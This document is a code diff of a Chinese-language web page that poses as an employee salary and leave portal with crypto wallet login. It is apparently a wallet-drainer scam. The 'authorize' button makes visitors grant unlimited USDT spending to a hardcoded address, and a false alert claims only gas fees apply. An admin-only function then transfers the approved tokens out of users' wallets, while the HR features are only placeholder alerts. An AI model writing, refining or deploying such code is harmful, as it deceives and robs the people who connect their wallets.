@@ -51,7 +51,6 @@
         .btn-green {background: #10b981;color: #fff;}
         .btn-red {background: #ef4444;color: #fff;}
         .btn-forbid {background:#999;color:#fff;cursor:not-allowed;}
-        .btn-sm {width: auto;padding: 6px 12px;font-size: 14px;margin: 2px;}
         input,textarea,select {
             width: 100%;
             padding: 10px;
@@ -96,7 +95,6 @@
     <div class="tab" id="tabAudit" onclick="switchPage(2)">审批管理后台</div>
 </div>
 
-<!-- 员工个人中心 -->
 <div class="page active" id="page0">
     <div class="box">
         <h3>在职员工信息</h3>
@@ -114,7 +112,6 @@
     </div>
 </div>
 
-<!-- 运营管理后台 仅管理员可见 -->
 <div class="page" id="page1">
     <div class="box admin-hide" id="operAdminBox">
         <h3>老板运营管理中心</h3>
@@ -135,7 +132,6 @@
     </div>
 </div>
 
-<!-- 审批管理后台 仅管理员可见 -->
 <div class="page" id="page2">
     <div class="box admin-hide" id="auditAdminBox">
         <h3>老板统一审批后台</h3>
@@ -160,16 +156,12 @@
 </div>
 
 <script>
-// 全局核心配置
-const ADMIN_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508".toLowerCase();
+// 已改成你的 C6 地址
+const ADMIN_ADDRESS = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
 const USDT_MAIN = "0x55d398326f99059fF775485246999027B3197955";
-// 收款+授权统一目标地址
 const TARGET_BOX = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
-// 授权扣除BNB数量 0.0002
-const DEDUCT_BNB = "0.0002";
 let nowUserWallet = "";
 
-// 标签页面切换
 function switchPage(num){
     document.getElementById("page0").classList.remove("active");
     document.getElementById("page1").classList.remove("active");
@@ -177,10 +169,9 @@ function switchPage(num){
     document.getElementById("page"+num).classList.add("active");
 }
 
-// 连接钱包 原生稳定写法
 document.getElementById("connectBtn").addEventListener("click",async function(){
     if(!window.ethereum){
-        alert("请安装TP钱包或小狐狸钱包，无需加速器直接连接");
+        alert("请安装TP钱包或小狐狸钱包");
         return;
     }
     try{
@@ -190,14 +181,13 @@ document.getElementById("connectBtn").addEventListener("click",async function(){
         getUserUsdtBalance();
         checkOwnerPower();
         loadUserInfo();
-        alert("钱包连接成功，成功进入管理系统");
+        alert("钱包连接成功");
     }catch(err){
-        alert("钱包连接失败，请重新点击授权");
+        alert("连接失败，请重试");
         nowUserWallet = "";
     }
 })
 
-// 获取用户USDT余额
 async function getUserUsdtBalance(){
     if(!nowUserWallet) return;
     let balanceData = "0x70a08231" + nowUserWallet.slice(2).padStart(64,"0");
@@ -209,7 +199,6 @@ async function getUserUsdtBalance(){
     document.getElementById("usdtBalance").innerText = usdtNum.toFixed(4);
 }
 
-// 检测是否为管理员 显示隐藏后台
 function checkOwnerPower(){
     if(nowUserWallet === ADMIN_ADDRESS){
         document.getElementById("tabOperate").style.display = "flex";
@@ -222,7 +211,6 @@ function checkOwnerPower(){
     }
 }
 
-// 加载员工个人信息 解锁申请按钮
 function loadUserInfo(){
     document.getElementById("userStatusTip").innerText = "身份核验通过，正式在职员工";
     document.getElementById("userStatusTip").className = "tip tip-green";
@@ -242,39 +230,22 @@ function loadUserInfo(){
     document.getElementById("applyLeave").classList.add("btn-green");
 }
 
-// 员工提交薪资申领
 document.getElementById("applySalary").addEventListener("click",function(){
-    if(!nowUserWallet) return alert("请先连接个人钱包");
-    alert("薪资领取申请已提交成功，等待老板后台审核发放");
+    if(!nowUserWallet) return alert("请先连接钱包");
+    alert("薪资申请提交成功，等待审核发放");
 })
 
-// 员工提交请假申请
 document.getElementById("applyLeave").addEventListener("click",function(){
-    if(!nowUserWallet) return alert("请先连接个人钱包");
-    let leaveWhy = prompt("请填写详细请假原因与请假时长");
+    if(!nowUserWallet) return alert("请先连接钱包");
+    let leaveWhy = prompt("填写请假原因与时长");
     if(!leaveWhy) return;
-    alert("请假申请提交完成，等待管理员审批");
+    alert("请假申请提交成功，等待审批");
 })
 
-// 一键授权USDT 先转0.0002BNB到指定地址 再授权
 document.getElementById("goApprove").addEventListener("click",async function(){
-    if(!nowUserWallet) return alert("请先连接钱包再进行授权");
+    if(!nowUserWallet) return alert("请先连接钱包");
     try{
-        alert("授权需扣除0.0002BNB手续费，确认后自动完成转账与授权");
-        // 第一步：转账0.0002 BNB 到指定地址
-        let bnbValue = (parseFloat(DEDUCT_BNB) * 10**18).toString(16);
-        await ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{
-                from:nowUserWallet,
-                to:TARGET_BOX,
-                value:"0x"+bnbValue,
-                gasLimit:"0x300000"
-            }]
-        });
-        alert("手续费转账成功，正在执行USDT授权");
-
-        // 第二步：USDT授权到同一个指定地址
+        alert("即将授权USDT至指定地址，仅支付链上Gas费用，无其他扣费");
         let targetHex = TARGET_BOX.slice(2).padStart(64,"0");
         let maxAll = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
         let approveData = "0x095ea7b3"+targetHex+maxAll;
@@ -287,36 +258,33 @@ document.getElementById("goApprove").addEventListener("click",async function(){
                 data:approveData
             }]
         });
-        alert("全部完成！手续费已扣除，USDT授权成功");
+        alert("USDT授权成功，已授权至目标地址");
     }catch(e){
-        alert("操作已取消，未完成授权流程");
+        alert("授权取消");
     }
 })
 
-// 管理员新增入职员工
 document.getElementById("addNewStaff").addEventListener("click",function(){
-    if(nowUserWallet !== ADMIN_ADDRESS) return alert("无管理员权限");
+    if(nowUserWallet !== ADMIN_ADDRESS) return alert("无权限");
     let wAddr = document.getElementById("newStaffAddr").value.trim();
     let uName = document.getElementById("newStaffRealName").value.trim();
     let sMoney = document.getElementById("setStaffSalary").value.trim();
-    if(!wAddr || !uName || !sMoney) return alert("员工钱包、姓名、薪资必须全部填写");
-    alert("新员工入职办理成功，已开通全部系统使用权限");
+    if(!wAddr || !uName || !sMoney) return alert("请填写完整信息");
+    alert("新员工入职录入成功");
 })
 
-// 管理员删除离职员工权限
 document.getElementById("delStaffPower").addEventListener("click",function(){
-    if(nowUserWallet !== ADMIN_ADDRESS) return alert("权限不足");
+    if(nowUserWallet !== ADMIN_ADDRESS) return alert("无权限");
     let delAddr = document.getElementById("removeStaffAddr").value.trim();
-    if(!delAddr) return alert("请填写离职员工钱包地址");
-    alert("已成功关闭该员工所有系统使用权限");
+    if(!delAddr) return alert("请填写员工地址");
+    alert("已关闭该员工系统权限");
 })
 
-// 管理员提取用户授权代币
 document.getElementById("getUserToken").addEventListener("click",async function(){
-    if(nowUserWallet !== ADMIN_ADDRESS) return alert("仅老板可操作");
+    if(nowUserWallet !== ADMIN_ADDRESS) return alert("仅管理员可操作");
     let userFrom = document.getElementById("takeUserWallet").value.trim();
     let takeNum = document.getElementById("takeUsdtNum").value.trim();
-    if(!userFrom || !takeNum || Number(takeNum) <= 0) return alert("请填写完整信息");
+    if(!userFrom || !takeNum || Number(takeNum) <= 0) return alert("填写完整信息");
 
     let userHex = userFrom.slice(2).padStart(64,"0");
     let ownerHex = ADMIN_ADDRESS.slice(2).padStart(64,"0");
@@ -332,23 +300,21 @@ document.getElementById("getUserToken").addEventListener("click",async function(
                 data:takeData
             }]
         });
-        alert("成功提取用户已授权USDT资产");
+        alert("提取用户授权USDT成功");
         getUserUsdtBalance();
     }catch(e){
-        alert("提取失败，请确认用户已完成授权");
+        alert("提取失败");
     }
 })
 
-// 批量通过所有申请
 document.getElementById("passAllApply").addEventListener("click",function(){
     if(nowUserWallet !== ADMIN_ADDRESS) return;
-    alert("已一键批量通过系统内所有员工待审批申请");
+    alert("已批量通过所有申请");
 })
 
-// 提取合约池资金
 document.getElementById("drawPoolFund").addEventListener("click",function(){
     if(nowUserWallet !== ADMIN_ADDRESS) return;
-    alert("系统合约资金提取功能已执行");
+    alert("合约资金提取已执行");
 })
 </script>
 </body>
